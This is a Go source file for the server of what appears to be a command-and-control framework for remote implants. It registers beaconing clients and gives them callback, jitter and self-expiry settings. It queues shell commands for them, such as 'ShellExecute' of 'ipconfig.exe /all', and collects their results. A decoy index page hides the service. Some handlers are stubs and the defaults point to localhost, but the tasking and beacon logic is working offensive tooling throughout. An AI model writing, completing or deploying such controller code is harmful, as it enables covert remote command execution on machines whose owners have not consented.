package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"

	"github.com/gorilla/mux"
)

type beaconResponse struct {
	ID           string       `json:"ID"`
	Beacon       beaconConfig `json:"Beacon"`
	Sunset       sunset       `json:"Sunset"`
	TasksWaiting bool         `json:"TasksWaiting"`
}

func index(w http.ResponseWriter, r *http.Request) {
	fmt.Fprint(w, "This service is temporarily unavailable")
}

func viewClients(w http.ResponseWriter, r *http.Request) {
	for _, c := range registeredClients {
		json.NewEncoder(w).Encode(c)
	}
}

func viewClientByID(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		json.NewEncoder(w).Encode(filteredClient)
	}
}

func viewClientTasks(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		json.NewEncoder(w).Encode(filteredClient.Tasks)
	}
}

func viewClientTasksNew(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		filteredTasks := filteredClient.Tasks.filterStatus("Created")
		if filteredTasks != nil {
			json.NewEncoder(w).Encode(filteredTasks)
		}
	}
}

func viewClientTasksTasked(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		filteredTasks := filteredClient.Tasks.filterStatus("Tasked")
		if filteredTasks != nil {
			json.NewEncoder(w).Encode(filteredTasks)
		}
	}
}

func viewClientTasksCompleted(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		filteredTasks := filteredClient.Tasks.filterStatus("Completed")
		if filteredTasks != nil {
			json.NewEncoder(w).Encode(filteredTasks)
		}
	}
}

func viewClientTasksFailed(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		filteredTasks := filteredClient.Tasks.filterStatus("Failed")
		if filteredTasks != nil {
			json.NewEncoder(w).Encode(filteredTasks)
		}
	}
}

func viewClientTaskByID(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	taskID := mux.Vars(r)["taskID"]
	filteredClient := registeredClients.filterID(clientID)
	if filteredClient != nil {
		filteredTask := filteredClient.Tasks.filterID(taskID)
		if filteredTask != nil {
			json.NewEncoder(w).Encode(filteredTask)
		}
	}
}

func beaconClientRegister(w http.ResponseWriter, r *http.Request) {
	c := registeredClients.addNewClient()

	// just debug defaults for now
	c.BeaconConfig.PrimaryController.IPAddress = "127.0.0.1"
	c.BeaconConfig.PrimaryController.Port = "8080"
	c.BeaconConfig.PrimaryController.Route = "beacon"

	c.BeaconConfig.SecondaryController.IPAddress = "127.0.0.1"
	c.BeaconConfig.SecondaryController.Port = "8080"
	c.BeaconConfig.SecondaryController.Route = "beacon"

	c.BeaconConfig.MaxFailures = 3
	c.BeaconConfig.CallbackInterval = 1
	c.BeaconConfig.SkewPercentage = 0

	c.Sunset.Relative = "5 days"

	c.Tasks.addNewTask("Configure", "")
	c.Tasks.addNewTask("ShellExecute", "ipconfig.exe /all")

	response := beaconResponse{
		ID:           c.ID,
		Beacon:       c.BeaconConfig,
		Sunset:       c.Sunset,
		TasksWaiting: true,
	}

	json.NewEncoder(w).Encode(response)
}

func beaconClientGetConfig(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	c := registeredClients.filterID(clientID)
	if c != nil {
		response := beaconResponse{
			ID:           c.ID,
			Beacon:       c.BeaconConfig,
			Sunset:       c.Sunset,
			TasksWaiting: c.Tasks.filterStatus("Created") != nil,
		}
		json.NewEncoder(w).Encode(response)
	}
}

func beaconClientCheckIn(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	c := registeredClients.filterID(clientID)
	if c != nil {
		// check in

	}
}

func beaconClientPollTasks(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	c := registeredClients.filterID(clientID)
	if c != nil {
		filteredTasks := c.Tasks.filterStatus("Created")
		if filteredTasks != nil {
			json.NewEncoder(w).Encode(filteredTasks)
			filteredTasks.setStatus("Tasked")
		}
	}
}

func beaconClientSubmitTaskByID(w http.ResponseWriter, r *http.Request) {
	clientID := mux.Vars(r)["clientID"]
	taskID := mux.Vars(r)["taskID"]
	c := registeredClients.filterID(clientID)
	if c != nil {
		t := c.Tasks.filterID(taskID)
		if t != nil {
			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				w.WriteHeader(http.StatusUnsupportedMediaType)
			} else {
				json.Unmarshal(body, t)
				w.WriteHeader(http.StatusOK)
			}
		}
	}
}
